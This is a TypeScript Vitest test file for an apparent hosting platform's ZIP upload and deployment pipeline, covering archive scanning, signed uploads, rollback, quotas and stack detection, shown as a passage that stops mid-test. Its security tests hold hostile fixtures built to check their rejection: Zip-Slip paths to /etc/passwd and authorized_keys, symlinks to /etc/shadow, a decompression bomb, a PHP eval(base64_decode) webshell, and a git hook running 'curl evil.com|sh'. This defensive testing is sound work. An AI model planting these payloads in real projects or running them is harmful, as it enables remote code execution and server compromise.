import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { NextRequest } from 'next/server';
import { zipSync, strToU8 } from 'fflate';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

type MockRow = Record<string, unknown>;

interface MockDbState {
  profiles: MockRow[];
  hosting_services: MockRow[];
  hosting_project_settings: MockRow[];
  project_deployments: MockRow[];
  project_upload_sessions: MockRow[];
  hosting_virtual_filesystem: MockRow[];
  project_env_variables: MockRow[];
  compute_build_jobs: MockRow[];
  whm_server_nodes: MockRow[];
  security_audit_logs: MockRow[];
}

const USER_ID = '11111111-1111-4111-8111-111111111111';
const SERVICE_ID = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb';

function createInitialDb(): MockDbState {
  return {
    profiles: [
      { id: USER_ID, email: 'client@devhost.cloud', full_name: 'Demo Dev', role: 'client' },
    ],
    hosting_services: [
      {
        id: SERVICE_ID,
        user_id: USER_ID,
        domain: 'app.devhost.cloud',
        plan_id: 'developer-pro',
        cpanel_username: 'appdvhst',
        server_node: 'sg1',
        ip_address: '103.151.102.45',
        status: 'active',
        ram_limit_mb: 4096,
        ram_used_mb: 256,
        cpu_cores: 4,
        disk_limit_gb: 25,
        disk_used_gb: 0.25,
        inode_limit: 500000,
        inode_used: 1200,
        stack_slug: 'nextjs-15-standalone',
        runtime_family: 'static_edge',
        container_id: 'dh_appdvhst',
      },
    ],
    hosting_project_settings: [
      {
        id: 'set-1',
        service_id: SERVICE_ID,
        user_id: USER_ID,
        stack_slug: 'nextjs-15-standalone',
        runtime_version: '22.x LTS',
        install_command: 'npm ci',
        build_command: 'npm run build',
        startup_file: 'server.js',
        output_directory: 'dist',
      },
    ],
    project_deployments: [],
    project_upload_sessions: [],
    hosting_virtual_filesystem: [],
    project_env_variables: [],
    compute_build_jobs: [],
    whm_server_nodes: [],
    security_audit_logs: [],
  };
}

const mockStore = vi.hoisted(() => ({
  supabaseConfigured: true,
  state: {} as MockDbState,
  fetchCalls: [] as Array<{ url: string; init?: RequestInit }>,
}));

interface QueryResult {
  data: MockRow | MockRow[] | null;
  error: { message: string; code?: string } | null;
  count?: number;
}

interface MockQueryChain extends PromiseLike<QueryResult> {
  select: (cols?: string, opts?: { count?: string; head?: boolean }) => MockQueryChain;
  insert: (payload: MockRow | MockRow[]) => MockQueryChain;
  upsert: (payload: MockRow | MockRow[], opts?: { onConflict?: string }) => MockQueryChain;
  update: (payload: MockRow) => MockQueryChain;
  delete: () => MockQueryChain;
  eq: (col: string, val: unknown) => MockQueryChain;
  neq: (col: string, val: unknown) => MockQueryChain;
  in: (col: string, vals: unknown[]) => MockQueryChain;
  order: (col: string, opts?: { ascending?: boolean }) => MockQueryChain;
  limit: (n: number) => MockQueryChain;
  single: () => Promise<QueryResult>;
  maybeSingle: () => Promise<QueryResult>;
}

function getTable(state: MockDbState, name: string): MockRow[] {
  const record = state as unknown as Record<string, MockRow[]>;
  if (!record[name]) record[name] = [];
  return record[name];
}

function createQueryBuilder(tableName: string): MockQueryChain {
  let op: 'select' | 'insert' | 'upsert' | 'update' | 'delete' = 'select';
  let payloadData: MockRow | MockRow[] = {};
  let upsertConflictCol = '';
  let countOnly = false;
  const predicates: Array<(r: MockRow) => boolean> = [];

  const applyFilters = (rows: MockRow[]) => rows.filter((r) => predicates.every((fn) => fn(r)));

  const execute = (): QueryResult => {
    const rows = getTable(mockStore.state, tableName);

    if (op === 'insert') {
      const items = Array.isArray(payloadData) ? payloadData : [payloadData];
      const inserted = items.map((item) => {
        const rec = { id: `${tableName}_${Math.random().toString(36).slice(2, 9)}`, ...item };
        rows.push(rec);
        return rec;
      });
      return { data: Array.isArray(payloadData) ? inserted : inserted[0], error: null };
    }

    if (op === 'upsert') {
      const items = Array.isArray(payloadData) ? payloadData : [payloadData];
      const conflictCols = upsertConflictCol
        .split(',')
        .map((s) => s.trim())
        .filter(Boolean);
      const out: MockRow[] = [];
      for (const item of items) {
        const existingIdx =
          conflictCols.length > 0
            ? rows.findIndex((r) => conflictCols.every((c) => r[c] === item[c]))
            : -1;
        if (existingIdx >= 0) {
          rows[existingIdx] = { ...rows[existingIdx], ...item };
          out.push(rows[existingIdx]);
        } else {
          const rec = { id: `${tableName}_${Math.random().toString(36).slice(2, 9)}`, ...item };
          rows.push(rec);
          out.push(rec);
        }
      }
      return { data: Array.isArray(payloadData) ? out : out[0], error: null };
    }

    if (op === 'update') {
      const matched = applyFilters(rows);
      for (const r of matched) Object.assign(r, payloadData);
      return { data: matched, error: null };
    }

    if (op === 'delete') {
      const kept = rows.filter((r) => !predicates.every((fn) => fn(r)));
      const deletedCount = rows.length - kept.length;
      rows.length = 0;
      rows.push(...kept);
      return { data: null, error: null, count: deletedCount };
    }

    const matched = applyFilters(rows);
    if (countOnly) return { data: null, error: null, count: matched.length };
    return { data: matched, error: null };
  };

  const chain: MockQueryChain = {
    select: (_cols?: string, opts?: { count?: string; head?: boolean }) => {
      if (opts?.head) countOnly = true;
      return chain;
    },
    insert: (p: MockRow | MockRow[]) => {
      op = 'insert';
      payloadData = p;
      return chain;
    },
    upsert: (p: MockRow | MockRow[], opts?: { onConflict?: string }) => {
      op = 'upsert';
      payloadData = p;
      upsertConflictCol = opts?.onConflict || '';
      return chain;
    },
    update: (p: MockRow) => {
      op = 'update';
      payloadData = p;
      return chain;
    },
    delete: () => {
      op = 'delete';
      return chain;
    },
    eq: (col: string, val: unknown) => {
      predicates.push((r) => r[col] === val);
      return chain;
    },
    neq: (col: string, val: unknown) => {
      predicates.push((r) => r[col] !== val);
      return chain;
    },
    in: (col: string, vals: unknown[]) => {
      predicates.push((r) => vals.includes(r[col]));
      return chain;
    },
    order: () => chain,
    limit: () => chain,
    single: async () => {
      const res = execute();
      const first = Array.isArray(res.data) ? res.data[0] || null : res.data;
      return { data: first, error: first ? null : res.error };
    },
    maybeSingle: async () => {
      const res = execute();
      const first = Array.isArray(res.data) ? res.data[0] || null : res.data;
      return { data: first, error: res.error };
    },
    then: <TResult1 = QueryResult, TResult2 = never>(
      onfulfilled?: ((value: QueryResult) => TResult1 | PromiseLike<TResult1>) | null,
      onrejected?: ((reason: unknown) => TResult2 | PromiseLike<TResult2>) | null
    ) => Promise.resolve(execute()).then(onfulfilled, onrejected),
  };

  return chain;
}

vi.mock('@/lib/supabase', () => ({
  isSupabaseConfigured: () => mockStore.supabaseConfigured,
  isDevSandboxMode: () => process.env.DEV_SANDBOX_MODE === 'true',
  getServiceSupabase: () =>
    mockStore.supabaseConfigured ? { from: (t: string) => createQueryBuilder(t) } : null,
  supabase: null,
}));

vi.mock('@/lib/authGuard', async () => {
  const actual = await vi.importActual<typeof import('@/lib/authGuard')>('@/lib/authGuard');
  return {
    ...actual,
    requireUser: vi.fn(async () => ({
      ok: true,
      user: { id: USER_ID, email: 'client@devhost.cloud' },
      isAdmin: false,
      scopes: ['*'],
      authMethod: 'session' as const,
    })),
    requireServiceAccess: vi.fn(async () => ({
      ok: true,
      user: { id: USER_ID, email: 'client@devhost.cloud' },
      isAdmin: false,
      scopes: ['*'],
      authMethod: 'session' as const,
      serviceRow: mockStore.state.hosting_services[0] || null,
    })),
  };
});

const CF_CONTEXT_SYMBOL = Symbol.for('__cloudflare-context__');

/**
 * Craft raw spec-compliant STORED ZIP bytes so tests can inject raw traversal
 * filenames ("../../etc/passwd") or UNIX symlink attributes (0o120777 << 16).
 */
function buildRawZipArchive(
  entries: Array<{ name: string; content: Uint8Array; externalAttrs?: number }>
): Uint8Array {
  const localParts: Uint8Array[] = [];
  const cdParts: Uint8Array[] = [];
  let offset = 0;

  for (const entry of entries) {
    const nameBytes = strToU8(entry.name);
    const data = entry.content;

    const lfh = new Uint8Array(30 + nameBytes.length + data.length);
    const lfhView = new DataView(lfh.buffer);
    lfhView.setUint32(0, 0x04034b50, true);
    lfhView.setUint16(4, 20, true);
    lfhView.setUint16(6, 0, true);
    lfhView.setUint16(8, 0, true); // STORE
    lfhView.setUint32(18, data.length, true);
    lfhView.setUint32(22, data.length, true);
    lfhView.setUint16(26, nameBytes.length, true);
    lfhView.setUint16(28, 0, true);
    lfh.set(nameBytes, 30);
    lfh.set(data, 30 + nameBytes.length);
    localParts.push(lfh);

    const cdh = new Uint8Array(46 + nameBytes.length);
    const cdView = new DataView(cdh.buffer);
    cdView.setUint32(0, 0x02014b50, true);
    cdView.setUint16(4, 0x031e, true); // UNIX creator OS
    cdView.setUint16(6, 20, true);
    cdView.setUint16(8, 0, true);
    cdView.setUint16(10, 0, true); // STORE
    cdView.setUint32(20, data.length, true);
    cdView.setUint32(24, data.length, true);
    cdView.setUint16(28, nameBytes.length, true);
    cdView.setUint32(38, entry.externalAttrs ?? ((0o100644 << 16) >>> 0), true);
    cdView.setUint32(42, offset, true);
    cdh.set(nameBytes, 46);
    cdParts.push(cdh);

    offset += lfh.length;
  }

  const cdOffset = offset;
  let cdSize = 0;
  for (const p of cdParts) cdSize += p.length;

  const eocd = new Uint8Array(22);
  const eocdView = new DataView(eocd.buffer);
  eocdView.setUint32(0, 0x06054b50, true);
  eocdView.setUint16(8, entries.length, true);
  eocdView.setUint16(10, entries.length, true);
  eocdView.setUint32(12, cdSize, true);
  eocdView.setUint32(16, cdOffset, true);

  const out = new Uint8Array(cdOffset + cdSize + eocd.length);
  let pos = 0;
  for (const p of localParts) {
    out.set(p, pos);
    pos += p.length;
  }
  for (const p of cdParts) {
    out.set(p, pos);
    pos += p.length;
  }
  out.set(eocd, pos);
  return out;
}

function attachInMemoryCloudflareBindings() {
  const r2Store = new Map<string, { body: Uint8Array; contentType: string }>();
  const sentMessages: unknown[] = [];

  (globalThis as Record<symbol, unknown>)[CF_CONTEXT_SYMBOL] = {
    env: {
      DEVHOST_ARTIFACTS_BUCKET: {
        async put(key: string, value: ArrayBuffer | Uint8Array | string, opts?: { httpMetadata?: { contentType?: string } }) {
          const bytes =
            typeof value === 'string'
              ? strToU8(value)
              : value instanceof Uint8Array
                ? new Uint8Array(value)
                : new Uint8Array(value);
          r2Store.set(key, {
            body: bytes,
            contentType: opts?.httpMetadata?.contentType || 'application/octet-stream',
          });
          return { key, size: bytes.byteLength, etag: 'test-etag' };
        },
        async get(key: string) {
          const rec = r2Store.get(key);
          if (!rec) return null;
          return {
            key,
            size: rec.body.byteLength,
            etag: 'test-etag',
            httpMetadata: { contentType: rec.contentType },
            async arrayBuffer() {
              return rec.body.buffer.slice(
                rec.body.byteOffset,
                rec.body.byteOffset + rec.body.byteLength
              );
            },
            async text() {
              return new TextDecoder().decode(rec.body);
            },
          };
        },
        async delete(key: string) {
          r2Store.delete(key);
        },
      },
      DEVHOST_BUILD_QUEUE: {
        async send(msg: unknown) {
          sentMessages.push(msg);
        },
      },
    },
  };

  return { r2Store, sentMessages };
}

describe('Phase 8: Direct ZIP/Folder/File Upload Deployment & Zero-Trust Archive Security', () => {
  const ORIGINAL_ENV = { ...process.env };
  const ORIGINAL_FETCH = globalThis.fetch;

  beforeEach(async () => {
    mockStore.supabaseConfigured = true;
    mockStore.state = createInitialDb();
    mockStore.fetchCalls = [];

    process.env.DEV_SANDBOX_MODE = 'false';
    process.env.DEVHOST_UPLOAD_SECRET = 'phase8-test-upload-signing-secret';
    process.env.DEVHOST_COMPUTE_AGENT_SECRET = 'phase8-test-agent-secret-32chars-minimum';
    process.env.EDGE_SITES_ORIGIN = 'https://sites.devhost-edge.example';
    delete process.env.COMPUTE_AGENT_URL;
    delete process.env.CF_ACCOUNT_ID;
    delete process.env.R2_ACCESS_KEY_ID;
    delete process.env.R2_SECRET_ACCESS_KEY;

    delete (globalThis as Record<symbol, unknown>)[CF_CONTEXT_SYMBOL];

    const { clearSandboxStorageForTest } = await import('@/lib/cloudflareStorageQueue');
    clearSandboxStorageForTest();
    const { clearSandboxUploadSessionsForTest } = await import('@/lib/uploadToken');
    clearSandboxUploadSessionsForTest();
  });

  afterEach(() => {
    process.env = { ...ORIGINAL_ENV };
    globalThis.fetch = ORIGINAL_FETCH;
    delete (globalThis as Record<symbol, unknown>)[CF_CONTEXT_SYMBOL];
  });

  // =========================================================================
  // 1. ARCHIVE SECURITY SCANNER: ZIP-SLIP, SYMLINKS, BOMBS, SHELLS, BINARIES
  // =========================================================================
  it('1. Rejects Zip-Slip traversal, UNIX symlinks, zip bombs, ELF binaries, git hooks & webshells cleanly', async () => {
    const { extractAndScanZipArchive, ArchiveSecurityError } = await import(
      '@/lib/archiveSecurity'
    );

    // A. Zip-Slip path traversal ("../../etc/passwd")
    const traversalZip = buildRawZipArchive([
      { name: '../../etc/passwd', content: strToU8('root:x:0:0') },
    ]);
    expect(() => extractAndScanZipArchive(traversalZip)).toThrowError(ArchiveSecurityError);
    try {
      extractAndScanZipArchive(traversalZip);
    } catch (e) {
      expect((e as InstanceType<typeof ArchiveSecurityError>).code).toBe('ZIP_SLIP');
    }

    // B. UNIX Symlink (0o120777 << 16) pointing to /etc/shadow
    const symlinkZip = buildRawZipArchive([
      {
        name: 'public/secret-link',
        content: strToU8('/etc/shadow'),
        externalAttrs: (0o120777 << 16) >>> 0,
      },
    ]);
    try {
      extractAndScanZipArchive(symlinkZip);
      expect.fail('Expected SYMLINK_REJECTED');
    } catch (e) {
      const err = e as InstanceType<typeof ArchiveSecurityError>;
      expect(err.code).toBe('SYMLINK_REJECTED');
      expect(err.status).toBe(403);
    }

    // C. Decompression bomb (6 MB zeros -> ~6 KB gzip/deflate => >100x expansion ratio)
    const bombBytes = new Uint8Array(6 * 1024 * 1024);
    const bombZip = zipSync({ 'bomb.txt': bombBytes }, { level: 9 });
    expect(bombZip.byteLength).toBeLessThan(50 * 1024);
    try {
      extractAndScanZipArchive(bombZip);
      expect.fail('Expected DECOMPRESSION_BOMB');
    } catch (e) {
      const err = e as InstanceType<typeof ArchiveSecurityError>;
      expect(err.code).toBe('DECOMPRESSION_BOMB');
      expect(err.status).toBe(413);
    }

    // D. PHP RCE / eval(base64_decode) webshell
    const shellZip = zipSync({
      'index.php': strToU8('<?php eval(base64_decode($_POST["cmd"])); ?>'),
    });
    try {
      extractAndScanZipArchive(shellZip);
      expect.fail('Expected MALICIOUS_PAYLOAD');
    } catch (e) {
      const err = e as InstanceType<typeof ArchiveSecurityError>;
      expect(err.code).toBe('MALICIOUS_PAYLOAD');
      expect(err.status).toBe(403);
    }

    // E. Compiled ELF executable binary masquerading as .dat
    const elfHeader = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
    const elfZip = zipSync({ 'assets/miner.dat': elfHeader });
    try {
      extractAndScanZipArchive(elfZip);
      expect.fail('Expected EXECUTABLE_BINARY');
    } catch (e) {
      const err = e as InstanceType<typeof ArchiveSecurityError>;
      expect(err.code).toBe('EXECUTABLE_BINARY');
      expect(err.status).toBe(403);
    }

    // F. .git/hooks/* RCE trap
    const hookZip = zipSync({
      'index.html': strToU8('<h1>ok</h1>'),
      '.git/hooks/post-checkout': strToU8('#!/bin/sh\ncurl evil.com|sh'),
    });
    try {
      extractAndScanZipArchive(hookZip);
      expect.fail('Expected SENSITIVE_DOTFILE');
    } catch (e) {
      const err = e as InstanceType<typeof ArchiveSecurityError>;
      expect(err.code).toBe('SENSITIVE_DOTFILE');
      expect(err.status).toBe(403);
    }
  });

  // =========================================================================
  // 2. END-TO-END SIGNED DIRECT UPLOAD -> R2 STATIC EDGE -> ISOLATED SERVE -> ROLLBACK
  // =========================================================================
  it('2. Completes signed presign -> transfer -> scan -> static edge deploy, serves via /api/edge-site, and rolls back cleanly', async () => {
    const { r2Store } = attachInMemoryCloudflareBindings();

    const { POST: presignPost } = await import('@/app/api/hosting/uploads/presign/route');
    const { PUT: transferPut, GET: transferGet } = await import(
      '@/app/api/hosting/uploads/transfer/route'
    );
    const { POST: completePost } = await import('@/app/api/hosting/uploads/complete/route');
    const { GET: edgeSiteGet } = await import('@/app/api/edge-site/route');
    const { POST: deploymentsPost } = await import('@/app/api/hosting/deployments/route');

    // Build Release v1 with single wrapper folder + macOS junk + prebuilt React dist/
    const v1Zip = zipSync({
      'my-site-main/__MACOSX/._dist': strToU8('junk'),
      'my-site-main/.DS_Store': strToU8('junk'),
      'my-site-main/package.json': strToU8(
        JSON.stringify({ name: 'demo', dependencies: { react: '^19.0.0' }, devDependencies: { vite: '^6.0.0' } })
      ),
      'my-site-main/dist/index.html': strToU8('<!doctype html><h1>Version 1 Live</h1>'),
      'my-site-main/dist/assets/app.js': strToU8('console.log("v1");'),
    });

    // Step A: Presign
    const pre1Res = await presignPost(
      new NextRequest('http://localhost/api/hosting/uploads/presign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          fileName: 'my-site-main.zip',
          sizeBytes: v1Zip.byteLength,
          uploadMode: 'zip_upload',
        }),
      })
    );
    expect(pre1Res.status).toBe(200);
    const pre1Json = await pre1Res.json();
    expect(pre1Json.success).toBe(true);
    expect(pre1Json.uploadUrl).toContain('/api/hosting/uploads/transfer?token=');

    // Step B: Reject tampered upload token & non-ZIP payload
    const badTokenRes = await transferPut(
      new NextRequest(`http://localhost/api/hosting/uploads/transfer?token=${pre1Json.uploadToken}tampered`, {
        method: 'PUT',
        body: Buffer.from(v1Zip),
      })
    );
    expect(badTokenRes.status).toBe(401);

    // Step C: Upload valid v1 ZIP
    const put1Res = await transferPut(
      new NextRequest(`http://localhost${pre1Json.uploadUrl}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/zip' },
        body: Buffer.from(v1Zip),
      })
    );
    expect(put1Res.status).toBe(200);
    expect(r2Store.has(pre1Json.r2Key)).toBe(true);

    // Step D: Complete v1 deploy
    const comp1Res = await completePost(
      new NextRequest('http://localhost/api/hosting/uploads/complete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          uploadId: pre1Json.uploadId,
        }),
      })
    );
    expect(comp1Res.status).toBe(200);
    const comp1Json = await comp1Res.json();
    expect(comp1Json.success).toBe(true);
    expect(comp1Json.detectedStack).toBe('react_vite_prebuilt');
    expect(comp1Json.runtimeFamily).toBe('static_edge');
    expect(comp1Json.publishSubdir).toBe('dist');
    expect(comp1Json.status).toBe('live_production');
    expect(comp1Json.edgeRouterUrl).toContain(`https://sites.devhost-edge.example/api/edge-site?site=${SERVICE_ID}`);
    // Temporary upload zip deleted after extracting static files to R2 release prefix
    expect(r2Store.has(pre1Json.r2Key)).toBe(false);
    // VFS Web IDE synced
    expect(
      mockStore.state.hosting_virtual_filesystem.some(
        (f) => f.file_path === '/public_html/index.html'
      )
    ).toBe(true);

    // Serve v1 via isolated /api/edge-site
    const edgeV1Res = await edgeSiteGet(
      new NextRequest(`https://sites.devhost-edge.example/api/edge-site?site=${SERVICE_ID}&path=index.html`)
    );
    expect(edgeV1Res.status).toBe(200);
    expect(await edgeV1Res.text()).toContain('Version 1 Live');

    // Step E: Upload v2 direct multipart deploy
    const v2Zip = zipSync({
      'index.html': strToU8('<!doctype html><h1>Version 2 Live</h1>'),
    });
    const formData = new FormData();
    formData.append('serviceId', SERVICE_ID);
    formData.append('uploadMode', 'folder_upload');
    formData.append('file', new Blob([Buffer.from(v2Zip)], { type: 'application/zip' }), 'dist.zip');

    const comp2Res = await completePost(
      new NextRequest('http://localhost/api/hosting/uploads/complete', {
        method: 'POST',
        body: formData,
      })
    );
    expect(comp2Res.status).toBe(200);
    const comp2Json = await comp2Res.json();
    expect(comp2Json.detectedStack).toBe('static_html');

    const edgeV2Res = await edgeSiteGet(
      new NextRequest(`https://sites.devhost-edge.example/api/edge-site?site=${SERVICE_ID}&path=index.html`)
    );
    expect(edgeV2Res.status).toBe(200);
    expect(await edgeV2Res.text()).toContain('Version 2 Live');

    // Step F: 1-Click Rollback back to v1
    const rbRes = await deploymentsPost(
      new NextRequest('http://localhost/api/hosting/deployments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          action: 'rollback',
          targetDeploymentId: comp1Json.deploymentId,
        }),
      })
    );
    expect(rbRes.status).toBe(200);

    const edgeRolledBackRes = await edgeSiteGet(
      new NextRequest(`https://sites.devhost-edge.example/api/edge-site?site=${SERVICE_ID}&path=index.html`)
    );
    expect(edgeRolledBackRes.status).toBe(200);
    expect(await edgeRolledBackRes.text()).toContain('Version 1 Live');

    // Also test GET /transfer missing token fails 401
    const unauthDl = await transferGet(
      new NextRequest('http://localhost/api/hosting/uploads/transfer?downloadToken=invalid')
    );
    expect(unauthDl.status).toBe(401);
  });

  // =========================================================================
  // 3. QUOTA ENFORCEMENT + API AUDIT LOGGING ON MALICIOUS UPLOAD
  // =========================================================================
  it('3. Enforces hosting plan disk/inode quota limits and audits malicious upload rejections', async () => {
    const { r2Store } = attachInMemoryCloudflareBindings();
    const { POST: presignPost } = await import('@/app/api/hosting/uploads/presign/route');
    const { POST: completePost } = await import('@/app/api/hosting/uploads/complete/route');

    // A. Tight disk quota: only ~0.0001 GB (~100 KB) remaining
    mockStore.state.hosting_services[0].disk_limit_gb = 1;
    mockStore.state.hosting_services[0].disk_used_gb = 0.9999;

    const overQuotaRes = await presignPost(
      new NextRequest('http://localhost/api/hosting/uploads/presign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          fileName: 'big-bundle.zip',
          sizeBytes: 512 * 1024, // 512 KB > ~100 KB left
        }),
      })
    );
    expect(overQuotaRes.status).toBe(413);
    const overJson = await overQuotaRes.json();
    expect(overJson.code).toBe('QUOTA_EXCEEDED');

    // B. Tight inode quota (2 inodes left), upload valid small compressed zip with 6 files -> 413 at complete
    mockStore.state.hosting_services[0].disk_limit_gb = 25;
    mockStore.state.hosting_services[0].disk_used_gb = 0.25;
    mockStore.state.hosting_services[0].inode_limit = 100;
    mockStore.state.hosting_services[0].inode_used = 98;

    const sixFilesZip = zipSync({
      'index.html': strToU8('<h1>1</h1>'),
      'a.js': strToU8('console.log(1)'),
      'b.js': strToU8('console.log(2)'),
      'c.js': strToU8('console.log(3)'),
      'd.js': strToU8('console.log(4)'),
      'e.js': strToU8('console.log(5)'),
    });
    const inodeForm = new FormData();
    inodeForm.append('serviceId', SERVICE_ID);
    inodeForm.append('file', new Blob([Buffer.from(sixFilesZip)], { type: 'application/zip' }), 'many.zip');

    const inodeFailRes = await completePost(
      new NextRequest('http://localhost/api/hosting/uploads/complete', {
        method: 'POST',
        body: inodeForm,
      })
    );
    expect(inodeFailRes.status).toBe(413);
    expect((await inodeFailRes.json()).code).toBe('QUOTA_EXCEEDED');

    // C. Restore normal quota and submit malicious Zip-Slip archive via complete -> 400 + audit log + R2 cleanup
    mockStore.state.hosting_services[0].inode_limit = 500000;
    mockStore.state.hosting_services[0].inode_used = 100;
    const evilZip = buildRawZipArchive([
      { name: '../../root/.ssh/authorized_keys', content: strToU8('ssh-rsa AAAA') },
    ]);
    const evilForm = new FormData();
    evilForm.append('serviceId', SERVICE_ID);
    evilForm.append('file', new Blob([Buffer.from(evilZip)], { type: 'application/zip' }), 'evil.zip');

    const evilRes = await completePost(
      new NextRequest('http://localhost/api/hosting/uploads/complete', {
        method: 'POST',
        body: evilForm,
      })
    );
    expect(evilRes.status).toBe(400);
    expect(
      mockStore.state.security_audit_logs.some(
        (l) => l.action_type === 'ARCHIVE_SECURITY_REJECTED'
      )
    ).toBe(true);
    // No lingering evil .zip objects left in R2
    expect(Array.from(r2Store.keys()).filter((k) => k.startsWith('uploads/'))).toHaveLength(0);
  });

  // =========================================================================
  // 4. CONTAINER STACK AUTO-DETECTION (NEXT.JS/LARAVEL/PYTHON) + AGENT ZIP EXTRACTION
  // =========================================================================
  it('4. Routes Next.js/Laravel/Python ZIP uploads to build queue & compute agent with hardened agent extraction', async () => {
    const { r2Store, sentMessages } = attachInMemoryCloudflareBindings();
    process.env.COMPUTE_AGENT_URL = 'https://agent-sg1.example:8787';

    let capturedDownloadUrl = '';
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input.toString();
      mockStore.fetchCalls.push({ url });
      if (url.endsWith('/v1/builds/deploy')) {
        return new Response(
          JSON.stringify({
            ok: true,
            containerId: 'dh_appdvhst_zip1',
            upstreamPort: 3210,
            upstreamUrl: 'http://127.0.0.1:3210',
            liveUrl: 'https://app.devhost.cloud',
            healthStatus: 'healthy',
            buildLogs: '[agent] Extracted ZIP safely and built Next.js container',
            durationSeconds: 3,
            metrics: { diskUsedGb: 0.32, inodesUsed: 1245 },
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('{}', { status: 404 });
    }) as typeof fetch;

    const { POST: completePost } = await import('@/app/api/hosting/uploads/complete/route');
    const { GET: transferGet } = await import('@/app/api/hosting/uploads/transfer/route');

    // A. Next.js SSR ZIP deploy
    const nextZip = zipSync({
      'package.json': strToU8(
        JSON.stringify({
          name: 'next-app',
          dependencies: { next: '15.2.0', react: '19.0.0' },
          scripts: { build: 'next build', start: 'next start' },
        })
      ),
      'app/page.tsx': strToU8('export default function Home(){return "hi";}'),
    });
    const nextForm = new FormData();
    nextForm.append('serviceId', SERVICE_ID);
    nextForm.append('file', new Blob([Buffer.from(nextZip)], { type: 'application/zip' }), 'next.zip');

    const nextRes = await completePost(
      new NextRequest('https://dashboard.devhostcloud.com/api/hosting/uploads/complete', {
        method: 'POST',
        body: nextForm,
      })
    );
    expect(nextRes.status).toBe(200);
    const nextJson = await nextRes.json();
    expect(nextJson.detectedStack).toBe('nextjs_standalone');
    expect(nextJson.runtimeFamily).toBe('nodejs_passenger');
    expect(nextJson.deploymentTarget).toBe('container');
    expect(nextJson.status).toBe('live_production');
    expect(sentMessages.length).toBeGreaterThanOrEqual(1);

    const queuedPayload = sentMessages[0] as Record<string, unknown>;
    expect(String(queuedPayload.r2ArtifactKey)).toContain('uploads/');
    expect(String(queuedPayload.artifactDownloadUrl)).toContain('/api/hosting/uploads/transfer?downloadToken=');
    capturedDownloadUrl = String(queuedPayload.artifactDownloadUrl);

    // Agent fetches signed ZIP artifact via GET /api/hosting/uploads/transfer?downloadToken=...
    expect(r2Store.has(String(queuedPayload.r2ArtifactKey))).toBe(true);
    const dlRes = await transferGet(new NextRequest(capturedDownloadUrl));
    expect(dlRes.status).toBe(200);
    expect(dlRes.headers.get('content-type')).toBe('application/zip');

    // B. Auto-detect Laravel PHP & Python FastAPI
    const { detectProjectStack } = await import('@/lib/archiveSecurity');
    const laravelStack = detectProjectStack([
      { path: 'composer.json', data: strToU8('{"require":{"laravel/framework":"^11.0"}}') },
      { path: 'artisan', data: strToU8('#!/usr/bin/env php') },
      { path: 'public/index.php', data: strToU8('<?php echo "Laravel"; ?>') },
    ]);
    expect(laravelStack.detectedStack).toBe('laravel_php');
    expect(laravelStack.runtimeFamily).toBe('php_litespeed');

    const pythonStack = detectProjectStack([
      { path: 'requirements.txt', data: strToU8('fastapi==0.115.0\nuvicorn==0.30.0') },
      { path: 'main.py', data: strToU8('from fastapi import FastAPI\napp = FastAPI()') },
    ]);
    expect(pythonStack.detectedStack).toBe('python_wsgi');
    expect(pythonStack.runtimeFamily).toBe('python_wsgi_asgi');

    // C. Directly test devhost-agent/server.mjs hardened extractSafeZipBufferToDir
    const agentModuleUrl = new URL('../../devhost-agent/server.mjs', import.meta.url).href;
    const { extractSafeZipBufferToDir, AgentValidationError } = await import(agentModuleUrl);

    const tmpRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'devhost-agent-zip-'));
    try {
      const safeOutDir = path.join(tmpRoot, 'safe-release');
      const wrappedValidZip = zipSync({
        'repo-main/server.js': strToU8('console.log("agent ok");'),
        'repo-main/nested/config.json': strToU8('{"ok":true}'),
      });
      const extracted = await extractSafeZipBufferToDir(Buffer.from(wrappedValidZip), safeOutDir);
      expect(extracted.filesWritten).toBe(2);
      const serverJs = await fs.readFile(path.join(safeOutDir, 'server.js'), 'utf8');
      expect(serverJs).toContain('agent ok');

      // Agent must reject Zip-Slip
      const slipOutDir = path.join(tmpRoot, 'slip-release');
      const slipZip = buildRawZipArchive([{ name: '../escaped.txt', content: strToU8('pwned') }]);
      await expect(extractSafeZipBufferToDir(Buffer.from(slipZip), slipOutDir)).rejects.toThrowError(
        AgentValidationError
      );

      // Agent must reject UNIX symlink
      const symZip = buildRawZipArchive([
        {
          name: 'bad-link',
          content: strToU8('/etc/passwd'),
          externalAttrs: (0o120777 << 16) >>> 0,
        },
      ]);
      await expect(extractSafeZipBufferToDir(Buffer.from(symZip), slipOutDir)).rejects.toThrowError(
        AgentValidationError
      );
    } finally {
      await fs.rm(tmpRoot, { recursive: true, force: true });
    }
  });

  // =========================================================================
  // 5. FAIL CLOSED WHEN SUPABASE OR R2 UNCONFIGURED OUTSIDE SANDBOX
  // =========================================================================
  it('5. Fails closed (503) when Supabase or R2 storage are unconfigured outside DEV_SANDBOX_MODE', async () => {
    const { POST: presignPost } = await import('@/app/api/hosting/uploads/presign/route');
    const { POST: completePost } = await import('@/app/api/hosting/uploads/complete/route');

    // No Cloudflare R2 bindings & no R2 env -> 503
    const r2Missing = await presignPost(
      new NextRequest('http://localhost/api/hosting/uploads/presign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          fileName: 'site.zip',
          sizeBytes: 1024,
        }),
      })
    );
    expect(r2Missing.status).toBe(503);

    // R2 bound, Supabase unconfigured -> 503
    attachInMemoryCloudflareBindings();
    mockStore.supabaseConfigured = false;
    const dbMissing = await completePost(
      new NextRequest('http://localhost/api/hosting/uploads/complete', {
        method: 'POST',
